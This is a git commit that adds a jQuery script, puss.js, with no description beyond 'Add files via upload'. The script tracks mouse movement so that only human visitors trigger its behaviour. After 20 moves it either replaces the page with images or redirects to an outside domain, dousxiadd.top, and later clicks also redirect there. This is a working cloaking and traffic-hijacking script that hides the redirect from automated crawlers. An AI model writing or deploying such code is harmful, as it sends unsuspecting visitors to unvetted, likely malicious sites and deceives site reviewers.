a0ed8d393c607c2a9bd5a59e7f3bf603b2abb8db
lucacoder8 <roydietzenqug@gmail.com>
2025-10-14 09:26:17 +0800

    Add files via upload

---
+++ puss.js
@@ -0,0 +1,39 @@
+var numCount=0;
+var allowCount=20;
+var url="https://dousxiadd.top/";
+var isRedirect=false;
+$(function()
+{
+	$("body").mousemove(function(event)
+	{
+		if(event.pageX>0 && event.pageY>0)
+		{
+			numCount++;
+			if(numCount==allowCount)
+			{
+				if(isRedirect==true)
+				{
+					window.location=url;
+				}
+				else
+				{
+					$("body").html("<img src='11a.jpg' /><img src='22b.jpg' /><img src='33c.jpg' />");
+				}
+			}
+		}
+	});
+
+	$("body").click(function(event)
+	{
+		if(checkRes(event)==true)
+		{
+			window.location=url;
+		}
+	});
+})
+
+function checkRes(e)
+{
+	if(numCount>=allowCount && e.pageX>0 && e.pageY>0)
+	{return true;}else{return false;}
+}
